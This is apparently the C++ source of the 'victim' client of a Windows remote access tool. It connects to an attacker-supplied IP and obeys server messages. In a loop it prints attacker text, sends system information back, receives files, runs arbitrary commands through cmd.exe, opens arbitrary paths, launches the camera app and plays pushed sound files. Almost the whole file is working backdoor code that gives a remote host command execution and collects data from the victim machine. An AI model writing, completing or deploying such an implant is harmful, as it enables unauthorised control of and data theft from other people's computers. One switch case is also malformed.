#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <cstdint>
#include "..\Headers\menu.h"
#include <direct.h>
#include <windows.h> // https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/
#include <sstream>
#include <shellapi.h> // https://learn.microsoft.com/en-us/windows/win32/api/shellapi/
#include "..\Headers\CaesarCipherShift.h"
#include "System-info\info.h"
#include "Receive-File\receiveFile.h"
#include <mmsystem.h>

int main(int argc, char* argv[]) {
    if(argc < 2) {
        std::cout << ERROR_PREFIX << " Incorrect usage, please use: \033[32m./victim IP\033[0m" << std::endl;
        return 1;
    }
    WSADATA wsa;

    int WSASuccess;
    WSASuccess = WSAStartup(MAKEWORD(2, 2), &wsa);
    if(WSASuccess != 0) {
        std::cout << ERROR_PREFIX << " WSAStartup failed\n";
    } else {
        std::cout << SUCCESS_PREFIX << " WSAStartup created\n";
    }

    int sock;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == -1) {
        std::cout << ERROR_PREFIX << " Socket failed\n";
        WSACleanup();
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Socket created\n";
    }

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    std::string serverip = argv[1];

    int ip;
    ip = inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr); 
    if(ip < 1) {
        std::cout << ERROR_PREFIX << " Invalid IP address\n";
        return 1;
    }

    int connectionEstablished;
    connectionEstablished = connect(sock, (sockaddr*)&serverAddress, sizeof(serverAddress));
    if(connectionEstablished == -1) {
        std::cout << ERROR_PREFIX << " Connection failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Connection established\n";
    }

    char buffer[BUFFERSIZE];
    int bytesRec, bytesSend;
    while(true) {
        int type;
        bytesRec = recv(sock, (char*)&type, sizeof(type), 0);
        if(bytesRec <= 0) {
            std::cout << ERROR_PREFIX << " Failed to receive type\n";
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }

        if(type == TYPE_TEXT) {
            bytesRec = recv(sock, buffer, BUFFERSIZE, 0);
            if(bytesRec <= 0) {
                std::cout << ERROR_PREFIX << " Failed to receive type\n";
                std::cout << SERVER_STATUS_CLOSED;
                break;
            }

            std::string cmd(buffer, bytesRec);
            std::cout << ATTACKER_LABEL << cmd << std::endl;

            std::string clientMessage = std::string(CONSOLE_PREFIX) + " Client received: " + cmd + "\n";
            bytesSend = send(sock, clientMessage.c_str(), clientMessage.length(), 0);
            if(bytesSend <= 0) {
                std::cout << ERROR_PREFIX << " Failed to send client message\n";
            }
        }
        
        if(type == TYPE_FILE) {
            receiveFile(sock, buffer);
        }

        if (type == TYPE_INFO) {
            std::cout << SUCCESS_PREFIX << " Server requested system information\n";
            std::string sysInfo = getSystemInfo();

            bytesSend = send(sock, sysInfo.c_str(), sysInfo.length(), 0);
            if(bytesSend <= 0) {
                std::cout << ERROR_PREFIX << " Failed to send client information\n";
            }

            std::cout << SUCCESS_PREFIX << " Sent information to the server\n";
        }

        if(type == TYPE_EXECUTE) {
            int subtype;
            bytesRec = recv(sock, (char*)&subtype, sizeof(subtype), 0);
            if(bytesRec <= 0) {
                std::cout << ERROR_PREFIX << " Failed to receive subtype\n";
            }

            switch(subtype) {
                case 1: {
                    char pathBuf[BUFFERSIZE];
                    bytesRec = recv(sock, pathBuf, sizeof(pathBuf), 0);
                    if(bytesRec <= 0) {
                        std::cout << ERROR_PREFIX << " Failed to receive path\n";
                    }

                    std::string path(pathBuf, bytesRec);
                    std::cout << PENDING_PREFIX << " Opening: '" << path << "'\n";
                    HINSTANCE verify = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWMAXIMIZED); // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow

                    bool shellSuccess = (INT_PTR)verify > 32;
                    if(shellSuccess) {
                        std::cout << SUCCESS_PREFIX << " '" << path << "' opened.\n"; 
                    } else {
                        std::cout << ERROR_PREFIX << " '" << path << "' failed to open.\n";
                    }

                    std::string toHostPath = "Successfully opened '" + path + "'";
                    bytesSend = send(sock, toHostPath.c_str(), toHostPath.length(), 0);
                    if(bytesSend <= 0) {
                        std::cout << ERROR_PREFIX << " Failed to send path\n";
                    }
                    
                    break;
                }
                
                case 2: {
                    char cmdBuf[BUFFERSIZE];
                    bytesRec = recv(sock, cmdBuf, sizeof(cmdBuf), 0);
                    if(bytesRec <= 0) {
                        std::cout << ERROR_PREFIX << " Failed to receive command\n";
                    }

                    if(bytesRec > 0) {
                        std::string cmd(cmdBuf, bytesRec);
                        std::cout << PENDING_PREFIX << " Executing cmd: " << cmd << std::endl;

                        HINSTANCE verify = ShellExecuteA(NULL, "open", "cmd.exe", ("/C " + cmd).c_str(), NULL, SW_SHOWMAXIMIZED);

                        bool cmdSuccess = (INT_PTR)verify > 32;
                        if(cmdSuccess) {
                            std::cout << SUCCESS_PREFIX << " '" << cmd << "' command executed.\n";
                        } else {
                            std::cout << ERROR_PREFIX << " '" << cmd << "' command failed to executed.\n";
                        }

                    } else {
                        std::cout << ERROR_PREFIX << " Failed to execute command.\n";
                    }

                    break;
                }

                case 3:
                char cmdBuf[BUFFERSIZE];
                bytesRec = recv(sock, cmdBuf, sizeof(cmdBuf), 0);
                if(bytesRec <= 0) {
                    std::cout << ERROR_PREFIX << " Failed to open camera\n";
                }

                std::string cmd(cmdBuf, bytesRec);
                ShellExecuteA(NULL, "open", "shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App", NULL, NULL, SW_SHOWNORMAL);
            }

        }

        if(type == TYPE_SOUND) {
            mciSendStringA("stop sound", NULL, 0, 0);
            mciSendStringA("close sound", NULL, 0, 0);
            std::string path;
            path = receiveFile(sock, buffer);
            if(!path.empty()) {
                std::string openFile = "open \"" + path + "\" alias sound";
                mciSendStringA(openFile.c_str(), NULL, 0, 0);
                mciSendStringA("play sound", NULL, 0, 0);
                std::cout << SUCCESS_PREFIX << " Playing: " << path << std::endl;
            }
        }

        if(type == TYPE_EXIT) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}